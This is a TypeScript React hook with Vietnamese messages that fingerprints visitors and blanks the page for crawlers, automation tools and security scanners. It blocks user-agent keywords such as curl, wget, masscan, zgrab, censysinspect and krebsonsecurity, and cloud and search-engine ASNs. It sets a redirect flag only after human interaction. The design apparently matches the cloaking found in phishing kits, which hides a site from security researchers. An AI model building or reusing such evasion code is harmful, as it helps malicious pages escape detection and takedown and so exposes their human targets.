import { useEffect, useState } from 'react';

interface BotDetectionResult {
	isBot: boolean;
	isLoading: boolean;
	shouldRedirect: boolean;
	blockReason?: string;
}

const blockedKeywords = [
	'bot',
	'crawler',
	'spider',
	'puppeteer',
	'selenium',
	'http',
	'client',
	'curl',
	'wget',
	'python',
	'java',
	'ruby',
	'go',
	'scrapy',
	'lighthouse',
	'censysinspect',
	'facebookexternalhit',
	'krebsonsecurity',
	'ivre-masscan',
	'ahrefs',
	'semrush',
	'sistrix',
	'mailchimp',
	'mailgun',
	'larbin',
	'libwww',
	'spinn3r',
	'zgrab',
	'masscan',
	'yandex',
	'baidu',
	'sogou',
	'tweetmeme',
	'misting',
	'BotPoke',
];

const blockedASNs = [
	15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075,
	214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939,
	209, 51396, 14618, 13614, 16591, 46664, 214640, 174, 36352, 46562, 32934,
];

const blockedIPs = ['95.214.55.43', '154.213.184.3'];

export const useBotDetection = (): BotDetectionResult => {
	const [isBot, setIsBot] = useState(false);
	const [isLoading, setIsLoading] = useState(true);
	const [shouldRedirect, setShouldRedirect] = useState(false);
	const [blockReason, setBlockReason] = useState<string>();

	const checkAndBlockBots = (): boolean => {
		const userAgent = navigator.userAgent.toLowerCase();
		const blockedKeyword = blockedKeywords.find((keyword) =>
			userAgent.includes(keyword),
		);
		if (blockedKeyword) {
			setBlockReason(
				`User-Agent chứa từ khóa bị chặn: ${blockedKeyword}`,
			);
			document.body.innerHTML = '';
			window.location.href = 'about:blank';
			return true;
		}
		return false;
	};

	const checkAndBlockByGeoIP = async (): Promise<boolean> => {
		try {
			const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
			const data = await response.json();

			if (blockedASNs.includes(Number(data.asn))) {
				setBlockReason(
					`ASN bị chặn: ${data.asn} (${data.organization_name ?? data.organization ?? 'Không rõ'})`,
				);
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				return true;
			}

			if (blockedIPs.includes(data.ip)) {
				setBlockReason(`IP bị chặn: ${data.ip}`);
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				return true;
			}

			return false;
		} catch {
			return false;
		}
	};

	const checkAdvancedWebDriverDetection = (): boolean => {
		if (navigator.webdriver === true) {
			setBlockReason('WebDriver được phát hiện');
			return true;
		}

		if ('__nightmare' in window) {
			setBlockReason('Nightmare.js được phát hiện');
			return true;
		}
		if ('_phantom' in window || 'callPhantom' in window) {
			setBlockReason('PhantomJS được phát hiện');
			return true;
		}
		if ('Buffer' in window) {
			setBlockReason('Node.js Buffer được phát hiện');
			return true;
		}
		if ('emit' in window) {
			setBlockReason('Node.js emit được phát hiện');
			return true;
		}
		if ('spawn' in window) {
			setBlockReason('Node.js spawn được phát hiện');
			return true;
		}

		const seleniumProps = [
			'__selenium_unwrapped',
			'__webdriver_evaluate',
			'__driver_evaluate',
			'__webdriver_script_function',
			'__webdriver_script_func',
			'__webdriver_script_fn',
			'__fxdriver_evaluate',
			'__driver_unwrapped',
			'__webdriver_unwrapped',
			'__selenium_evaluate',
			'__fxdriver_unwrapped',
		];

		const foundSeleniumProp = seleniumProps.find((prop) => prop in window);
		if (foundSeleniumProp) {
			setBlockReason(
				`Selenium property được phát hiện: ${foundSeleniumProp}`,
			);
			return true;
		}

		if ('__webdriver_evaluate' in document) {
			setBlockReason('WebDriver evaluate trong document được phát hiện');
			return true;
		}
		if ('__selenium_evaluate' in document) {
			setBlockReason('Selenium evaluate trong document được phát hiện');
			return true;
		}
		if ('__webdriver_script_function' in document) {
			setBlockReason(
				'WebDriver script function trong document được phát hiện',
			);
			return true;
		}

		return false;
	};

	const checkNavigatorAnomalies = (): boolean => {
		if (navigator.webdriver === true) {
			setBlockReason('Navigator webdriver được phát hiện');
			return true;
		}

		if (
			navigator.hardwareConcurrency &&
			navigator.hardwareConcurrency > 128
		) {
			setBlockReason(
				`Hardware concurrency bất thường: ${navigator.hardwareConcurrency} (quá cao)`,
			);
			return true;
		}
		if (
			navigator.hardwareConcurrency &&
			navigator.hardwareConcurrency < 1
		) {
			setBlockReason(
				`Hardware concurrency bất thường: ${navigator.hardwareConcurrency} (quá thấp)`,
			);
			return true;
		}

		return false;
	};

	const checkScreenAnomalies = (): boolean => {
		if (screen.width === 2000 && screen.height === 2000) {
			setBlockReason('Màn hình có kích thước đáng ngờ: 2000x2000');
			return true;
		}

		if (screen.width > 4000 || screen.height > 4000) {
			setBlockReason(
				`Màn hình quá lớn: ${screen.width}x${screen.height}`,
			);
			return true;
		}
		if (screen.width < 200 || screen.height < 200) {
			setBlockReason(
				`Màn hình quá nhỏ: ${screen.width}x${screen.height}`,
			);
			return true;
		}

		if (
			screen.availWidth === screen.width &&
			screen.availHeight === screen.height
		) {
			if (screen.width > 1000 && screen.height > 1000) {
				setBlockReason(
					`Màn hình không có taskbar/dock: ${screen.width}x${screen.height}`,
				);
				return true;
			}
		}
		if (screen.width === screen.height && screen.width >= 1500) {
			setBlockReason(
				`Màn hình vuông bất thường: ${screen.width}x${screen.height}`,
			);
			return true;
		}
		return false;
	};

	useEffect(() => {
		const handleUserInteraction = () => {
			if (!isBot && !isLoading) {
				setShouldRedirect(true);
			}
		};

		const events = [
			'mousemove',
			'mousedown',
			'mouseup',
			'click',
			'touchstart',
			'touchmove',
			'touchend',
			'scroll',
			'keydown',
		];

		events.forEach((event) => {
			document.addEventListener(event, handleUserInteraction, {
				once: true,
				passive: true,
			});
		});

		return () => {
			events.forEach((event) => {
				document.removeEventListener(event, handleUserInteraction);
			});
		};
	}, [isBot, isLoading]);

	useEffect(() => {
		const detectBot = async () => {
			if (checkAndBlockBots()) {
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			if (checkAdvancedWebDriverDetection()) {
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			if (checkNavigatorAnomalies()) {
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			if (checkScreenAnomalies()) {
				document.body.innerHTML = '';
				window.location.href = 'about:blank';
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			const isBlockedByGeoIP = await checkAndBlockByGeoIP();
			if (isBlockedByGeoIP) {
				setIsBot(true);
				setIsLoading(false);
				return;
			}

			const obviousBotKeywords = [
				'googlebot',
				'bingbot',
				'crawler',
				'spider',
			];
			const foundObviousBotKeyword = obviousBotKeywords.find((keyword) =>
				navigator.userAgent.toLowerCase().includes(keyword),
			);

			if (foundObviousBotKeyword) {
				setBlockReason(
					`Bot rõ ràng được phát hiện: ${foundObviousBotKeyword}`,
				);
				setIsBot(true);
			} else {
				setIsBot(false);
			}
			setIsLoading(false);
		};

		const timer = setTimeout(detectBot, 100);

		return () => clearTimeout(timer);
	}, []);

	return { isBot, isLoading, shouldRedirect, blockReason };
};
